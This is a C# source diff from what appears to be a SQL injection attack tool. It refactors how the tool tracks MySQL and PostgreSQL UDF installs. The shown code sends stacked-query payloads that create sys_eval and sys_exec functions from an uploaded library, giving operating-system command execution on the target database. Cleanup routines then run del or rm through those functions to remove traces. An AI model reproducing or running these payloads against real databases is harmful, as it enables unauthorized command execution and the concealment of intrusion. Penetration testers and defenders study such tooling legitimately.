@@ -51,7 +51,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             {
                 return true;
             }
-            InjectRecord? rec = InjectChannelRegistry.FindByType(config.Host, config.Port, dc.InjectParamName, InjectType.Stacked);
+            InjectRecord? rec = InjectChannelRegistry.FindByType(config, dc.InjectParamName, InjectType.Stacked);
             if (rec == null)
             {
                 return false;
@@ -75,6 +75,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
         /// </summary>
         public static async Task ExecuteFile(AppConfig config, FileCmdViewModel vm)
         {
+            using var payloadScope = PayloadFactory.Activate(config);
             if (!MainViewViewModel.EnsureDataOpReady(config))
             {
                 return;
@@ -535,6 +536,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
         /// </summary>
         public static async Task ExecuteCmd(AppConfig config, FileCmdViewModel vm)
         {
+            using var payloadScope = PayloadFactory.Activate(config);
             if (!MainViewViewModel.EnsureDataOpReady(config))
             {
                 return;
@@ -574,17 +576,6 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             }
             await ExecuteCmdSQLServer(config, vm).ConfigureAwait(false);
         }
-
-        /// <summary>
-        /// 已完成UDF安装的目标标识（避免每次命令重复上传库文件）
-        /// </summary>
-        private static string? _udfReadyKey = null;
-
-        /// <summary>已安装UDF库文件的目标路径（清理痕迹时删除用，Provision成功后记录）</summary>
-        private static string? _udfInstalledPath = null;
-
-        /// <summary>已安装UDF目标是否Windows平台（清理时选择del/rm命令）</summary>
-        private static bool _udfInstalledIsWindows = false;
 
         /// <summary>
         /// 按当前注入类型取一个标量值（Union/报错直接回显，盲注逐字符）
@@ -687,9 +678,14 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             await SendPayload(config, " 1=1;drop function if exists sys_eval;drop function if exists sys_exec;"
                 + "create function sys_eval returns string soname '" + libName + "';"
                 + "create function sys_exec returns int soname '" + libName + "';select 1 where 1=1 ").ConfigureAwait(false);
-            //记录安装痕迹（库文件路径/平台），供--cleanup式清理使用
-            _udfInstalledPath = targetPath;
-            _udfInstalledIsWindows = (compileOs ?? "").Contains("win", StringComparison.OrdinalIgnoreCase);
+            //记录完整安装证据，供状态查看、退出提醒和显式清理使用。
+            UdfInstallationState state = config.UdfSession.MySql;
+            state.InstalledPath = targetPath;
+            state.IsWindows = (compileOs ?? "").Contains("win", StringComparison.OrdinalIgnoreCase);
+            state.InstalledAtUtc = DateTimeOffset.UtcNow;
+            state.BinarySize = udf.Length;
+            state.Sha256 = Convert.ToHexString(System.Security.Cryptography.SHA256.HashData(udf));
+            Log.Success($"MySQL UDF已记录：{state.BinarySize}字节，SHA256={state.Sha256}，路径={state.InstalledPath}");
             Log.Show("UDF安装流程完成！如命令执行无结果请检查：1.目标是否支持堆叠查询 2.账号是否有mysql库写权限 3.库文件是否写入成功（secure_file_priv需为空或包含plugin目录）");
         }
 
@@ -704,14 +700,15 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 Log.Warning("UDF清理仅适用于MySQL UDF命令执行通道！");
                 return;
             }
+            UdfInstallationState state = config.UdfSession.MySql;
             //1.删除UDF库文件（函数还在，借sys_eval执行系统删除命令；文件被MySQL进程占用时删除可能失败，仅尽力而为）
-            if (!string.IsNullOrEmpty(_udfInstalledPath))
+            if (!string.IsNullOrEmpty(state.InstalledPath))
             {
-                string delCmd = _udfInstalledIsWindows
-                    ? "cmd /c del /f /q \"" + _udfInstalledPath.Replace("/", "\\", StringComparison.Ordinal) + "\""
-                    : "rm -f '" + _udfInstalledPath + "'";
+                string delCmd = state.IsWindows
+                    ? "cmd /c del /f /q \"" + state.InstalledPath.Replace("/", "\\", StringComparison.Ordinal) + "\""
+                    : "rm -f '" + state.InstalledPath + "'";
                 string cmdHex = Convert.ToHexString(Encoding.UTF8.GetBytes(delCmd));
-                Log.Show("正在删除UDF库文件：" + _udfInstalledPath);
+                Log.Show("正在删除UDF库文件：" + state.InstalledPath);
                 try
                 {
                     await FetchScalar(config, "(select cast(sys_eval(0x" + cmdHex + ") as char(500)))").ConfigureAwait(false);
@@ -728,23 +725,11 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             //2.drop函数（需要堆叠查询支持）
             Log.Show("正在删除sys_eval/sys_exec函数……");
             await SendPayload(config, " 1=1;drop function if exists sys_eval;drop function if exists sys_exec;select 1 where 1=1 ").ConfigureAwait(false);
-            //3.复位安装状态
-            _udfReadyKey = null;
-            _udfInstalledPath = null;
-            _udfInstalledIsWindows = false;
+            state.Reset();
             Log.Success("UDF痕迹清理完成：函数已drop，库文件已尽力删除。请人工确认plugin目录无残留的sqlib*文件！");
         }
 
         //==================== PostgreSQL UDF（lib_postgresqludf_sys，对标业界同类工具 PG takeover，需堆叠通道）====================
-
-        /// <summary>PG UDF 已安装目标标识</summary>
-        private static string? _pgUdfReadyKey = null;
-
-        /// <summary>PG UDF 库文件目标路径（清理用）</summary>
-        private static string? _pgUdfInstalledPath = null;
-
-        /// <summary>PG UDF 目标是否 Windows 平台（清理时选择del/rm命令）</summary>
-        private static bool _pgUdfInstalledIsWindows = false;
 
         /// <summary>堆叠通道发一条SQL语句（PG UDF部署用）</summary>
         private static async Task SendStackedStmt(AppConfig config, string stmt)
@@ -807,8 +792,13 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             Log.Show("UDF库文件已落盘，正在创建sys_eval/sys_exec函数……");
             await SendStackedStmt(config, "CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '" + targetPath + "', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE").ConfigureAwait(false);
             await SendStackedStmt(config, "CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS integer AS '" + targetPath + "', 'sys_exec' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE").ConfigureAwait(false);
-            _pgUdfInstalledPath = targetPath;
-            _pgUdfInstalledIsWindows = isWindows;
+            UdfInstallationState state = config.UdfSession.PostgreSql;
+            state.InstalledPath = targetPath;
+            state.IsWindows = isWindows;
+            state.InstalledAtUtc = DateTimeOffset.UtcNow;
+            state.BinarySize = udf.Length;
+            state.Sha256 = Convert.ToHexString(System.Security.Cryptography.SHA256.HashData(udf));
+            Log.Success($"PostgreSQL UDF已记录：{state.BinarySize}字节，SHA256={state.Sha256}，路径={state.InstalledPath}");
             //部署自检：sys_eval echo 探活，函数未建成/库不兼容时立刻可见（避免用户以为安装成功）
             try
             {
@@ -834,11 +824,13 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
         {
             try
             {
-                string targetKey = config.RequestTxt ?? "";
-                if (!string.Equals(_pgUdfReadyKey, targetKey, StringComparison.Ordinal))
+                string targetKey = TargetFingerprint.ForConfig(config);
+                UdfInstallationState udfState = config.UdfSession.PostgreSql;
+                if (!string.Equals(udfState.ReadyTargetKey, targetKey, StringComparison.Ordinal))
                 {
                     await ProvisionPgUdf(config).ConfigureAwait(false);
-                    _pgUdfReadyKey = targetKey;
+                    udfState.ReadyTargetKey = targetKey;
+                    Log.Show("当前PostgreSQL UDF状态：\n" + config.UdfSession.DescribeInstalled(("PostgreSQL", udfState)));
                 }
                 string cmdEsc = vm.CmdText.Replace("'", "''", StringComparison.Ordinal);
                 if (!vm.CmdShowResult)
@@ -865,12 +857,13 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
         /// <summary>PG UDF痕迹清理（cleanup 能力）：借sys_eval删除库文件→drop函数→复位状态</summary>
         public static async Task CleanupPgUdf(AppConfig config)
         {
-            if (!string.IsNullOrEmpty(_pgUdfInstalledPath))
+            UdfInstallationState state = config.UdfSession.PostgreSql;
+            if (!string.IsNullOrEmpty(state.InstalledPath))
             {
-                string delCmd = _pgUdfInstalledIsWindows
-                    ? "cmd /c del /f /q \"" + _pgUdfInstalledPath.Replace("/", "\\", StringComparison.Ordinal) + "\""
-                    : "rm -f '" + _pgUdfInstalledPath + "'";
-                Log.Show("正在删除UDF库文件：" + _pgUdfInstalledPath);
+                string delCmd = state.IsWindows
+                    ? "cmd /c del /f /q \"" + state.InstalledPath.Replace("/", "\\", StringComparison.Ordinal) + "\""
+                    : "rm -f '" + state.InstalledPath + "'";
+                Log.Show("正在删除UDF库文件：" + state.InstalledPath);
                 try
                 {
                     await FetchScalar(config, "(select sys_eval('" + delCmd.Replace("'", "''", StringComparison.Ordinal) + "'))").ConfigureAwait(false);
@@ -887,15 +880,14 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             Log.Show("正在删除sys_eval/sys_exec函数……");
             await SendStackedStmt(config, "drop function if exists sys_eval(text)").ConfigureAwait(false);
             await SendStackedStmt(config, "drop function if exists sys_exec(text)").ConfigureAwait(false);
-            _pgUdfReadyKey = null;
-            _pgUdfInstalledPath = null;
-            _pgUdfInstalledIsWindows = false;
+            state.Reset();
             Log.Success("PG UDF痕迹清理完成：函数已drop，库文件已尽力删除。请人工确认临时目录无残留的sqlib*文件！");
         }
 
         /// <summary>UDF痕迹清理入口：按数据库类型分发（MySQL/PostgreSQL）</summary>
         public static async Task CleanupUdf(AppConfig config)
         {
+            using var payloadScope = PayloadFactory.Activate(config);
             if (config.DataConfig.SelectedDBType.Equals(DBType.PostgreSQL))
             {
                 await CleanupPgUdf(config).ConfigureAwait(false);
@@ -912,11 +904,13 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             try
             {
                 //TxtRequest是AvaloniaEdit文档，工作线程直接读Text会抛"Call from invalid thread"；RequestTxt为同步镜像纯字符串
-                string targetKey = config.RequestTxt ?? "";
-                if (!string.Equals(_udfReadyKey, targetKey, StringComparison.Ordinal))
+                string targetKey = TargetFingerprint.ForConfig(config);
+                UdfInstallationState udfState = config.UdfSession.MySql;
+                if (!string.Equals(udfState.ReadyTargetKey, targetKey, StringComparison.Ordinal))
                 {
                     await ProvisionMySqlUdf(config).ConfigureAwait(false);
-                    _udfReadyKey = targetKey;
+                    udfState.ReadyTargetKey = targetKey;
+                    Log.Show("当前MySQL UDF状态：\n" + config.UdfSession.DescribeInstalled(("MySQL", udfState)));
                 }
                 string cmdHex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.CmdText));
                 if (!vm.CmdShowResult)
